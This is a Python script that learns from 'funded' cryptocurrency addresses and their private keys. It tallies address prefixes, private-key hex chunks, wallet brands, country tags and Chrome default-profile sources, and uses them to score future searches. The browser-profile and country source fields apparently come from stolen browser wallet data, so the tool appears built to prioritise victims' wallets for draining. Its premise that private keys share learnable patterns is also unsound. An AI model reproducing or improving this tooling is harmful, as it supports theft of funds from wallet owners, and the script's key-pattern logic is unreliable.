from collections import Counter
#!/usr/bin/env python3
"""
Pattern Learning System - Learns from funded addresses to improve future searches
"""
import json
import re
from collections import defaultdict, Counter

class PatternLearner:
    def __init__(self):
        self.funded_patterns = []
        self.success_patterns = {
            'address_prefixes': Counter(),
            'address_suffixes': Counter(), 
            'private_key_patterns': Counter(),
            'source_patterns': Counter(),
            'geographic_patterns': Counter(),
            'wallet_types': Counter()
        }
    
    def load_funded_addresses(self, funded_file):
        """Load previously found funded addresses to learn patterns"""
        try:
            with open(funded_file, 'r') as f:
                data = json.load(f)
                
            if 'funded_addresses' in data:
                funded = data['funded_addresses']
            elif 'addresses' in data:
                funded = data['addresses']
            elif isinstance(data, list):
                funded = data
            else:
                funded = []
                
            self.funded_patterns = funded
            print(f"📚 Loaded {len(funded)} funded addresses for pattern learning")
            return len(funded)
        except FileNotFoundError:
            print("📚 No previous funded addresses found - starting fresh")
            return 0
        except Exception as e:
            print(f"⚠️  Error loading funded addresses: {e}")
            return 0
    
    def analyze_funded_patterns(self):
        """Analyze funded addresses to extract successful patterns"""
        if not self.funded_patterns:
            print("💡 No funded addresses to learn from yet")
            return
        
        print(f"🧠 Analyzing {len(self.funded_patterns)} funded addresses...")
        
        for addr_data in self.funded_patterns:
            address = addr_data.get('address', '')
            private_key = addr_data.get('private_key', '')
            source = addr_data.get('source', '')
            balance = addr_data.get('balance', 0)
            
            # Learn address patterns
            if address:
                if address.startswith('0x'):
                    # Ethereum patterns
                    self.success_patterns['address_prefixes'][address[:6]] += 1  # 0x1234
                    self.success_patterns['address_suffixes'][address[-6:]] += 1  # last 6 chars
                elif address.startswith('1') or address.startswith('3'):
                    # Bitcoin patterns
                    self.success_patterns['address_prefixes'][address[:4]] += 1  # 1Abc
                    self.success_patterns['address_suffixes'][address[-4:]] += 1  # last 4 chars
            
            # Learn private key patterns
            if private_key and len(private_key) >= 8:
                # Look for recurring hex patterns
                for i in range(0, len(private_key)-4, 4):
                    chunk = private_key[i:i+4]
                    if not chunk.count('0') == 4:  # Skip all-zero chunks
                        self.success_patterns['private_key_patterns'][chunk] += 1
            
            # Learn source patterns
            if source:
                # Extract wallet type
                source_lower = source.lower()
                if 'metamask' in source_lower:
                    self.success_patterns['wallet_types']['MetaMask'] += 1
                elif 'trust' in source_lower:
                    self.success_patterns['wallet_types']['Trust'] += 1
                elif 'phantom' in source_lower:
                    self.success_patterns['wallet_types']['Phantom'] += 1
                elif 'coinbase' in source_lower:
                    self.success_patterns['wallet_types']['Coinbase'] += 1
                
                # Extract geographic patterns
                geo_match = re.search(r'\[([A-Z]{2})\]', source)
                if geo_match:
                    country = geo_match.group(1)
                    self.success_patterns['geographic_patterns'][country] += 1
                
                # Extract browser/profile patterns
                if 'chrome' in source_lower:
                    self.success_patterns['source_patterns']['Chrome'] += 1
                if 'default' in source_lower:
                    self.success_patterns['source_patterns']['Default_Profile'] += 1
        
        self.print_learned_patterns()
    
    def print_learned_patterns(self):
        """Print what patterns we've learned"""
        print(f"\n🎓 LEARNED SUCCESS PATTERNS:")
        
        print(f"\n🏆 Top Address Prefixes:")
        for pattern, count in self.success_patterns['address_prefixes'].most_common(5):
            print(f"   {pattern}: {count} times")
        
        print(f"\n🏆 Top Wallet Types:")
        for wallet, count in self.success_patterns['wallet_types'].most_common(5):
            print(f"   {wallet}: {count} times")
        
        print(f"\n🏆 Top Geographic Patterns:")
        for country, count in self.success_patterns['geographic_patterns'].most_common(5):
            print(f"   {country}: {count} times")
        
        print(f"\n🏆 Top Private Key Patterns:")
        for pattern, count in self.success_patterns['private_key_patterns'].most_common(5):
            print(f"   {pattern}: {count} times")
    
    def calculate_learned_score(self, address, private_key="", source=""):
        """Calculate score based on learned patterns"""
        score = 0.0
        
        # Check address patterns
        if address.startswith('0x') and len(address) >= 6:
            prefix = address[:6]
            suffix = address[-6:]
            score += self.success_patterns['address_prefixes'].get(prefix, 0) * 5
            score += self.success_patterns['address_suffixes'].get(suffix, 0) * 3
        elif address.startswith(('1', '3')) and len(address) >= 4:
            prefix = address[:4]
            suffix = address[-4:]
            score += self.success_patterns['address_prefixes'].get(prefix, 0) * 5
            score += self.success_patterns['address_suffixes'].get(suffix, 0) * 3
        
        # Check private key patterns
        if private_key and len(private_key) >= 8:
            for i in range(0, len(private_key)-4, 4):
                chunk = private_key[i:i+4]
                score += self.success_patterns['private_key_patterns'].get(chunk, 0) * 2
        
        # Check source patterns
        if source:
            source_lower = source.lower()
            
            # Wallet type bonus
            for wallet_type in ['metamask', 'trust', 'phantom', 'coinbase']:
                if wallet_type in source_lower:
                    bonus = self.success_patterns['wallet_types'].get(wallet_type.title(), 0)
                    score += bonus * 3
            
            # Geographic bonus
            geo_match = re.search(r'\[([A-Z]{2})\]', source)
            if geo_match:
                country = geo_match.group(1)
                score += self.success_patterns['geographic_patterns'].get(country, 0) * 4
            
            # Browser/profile bonus
            if 'chrome' in source_lower:
                score += self.success_patterns['source_patterns'].get('Chrome', 0) * 2
            if 'default' in source_lower:
                score += self.success_patterns['source_patterns'].get('Default_Profile', 0) * 2
        
        return score
    
    def save_learned_patterns(self, output_file="learned_patterns.json"):
        """Save learned patterns for future use"""
        patterns_data = {
            'total_funded_analyzed': len(self.funded_patterns),
            'patterns': {}
        }
        
        for pattern_type, pattern_dict in self.success_patterns.items():
            patterns_data['patterns'][pattern_type] = dict(pattern_dict)
        
        with open(output_file, 'w') as f:
            json.dump(patterns_data, f, indent=2)
        
        print(f"💾 Learned patterns saved to: {output_file}")

def main():
    learner = PatternLearner()
    
    print("🧠 PATTERN LEARNING SYSTEM")
    print("=" * 50)
    
    # Try to load any existing funded addresses
    funded_files = ['funded_addresses.json', 'wallet_results.json', 'successful_finds.json']
    
    loaded = False
    for funded_file in funded_files:
        try:
            count = learner.load_funded_addresses(funded_file)
            if count > 0:
                loaded = True
                break
        except:
            continue
    
    if loaded:
        # Analyze patterns from funded addresses
        learner.analyze_funded_patterns()
        learner.save_learned_patterns()
    else:
        print("💡 No funded addresses found to learn from.")
        print("🔍 Run some balance checks first to find funded addresses,")
        print("    then this system will learn from them to improve future searches!")
    
    print(f"\n✅ Pattern learning complete!")

if __name__ == "__main__":
    main()
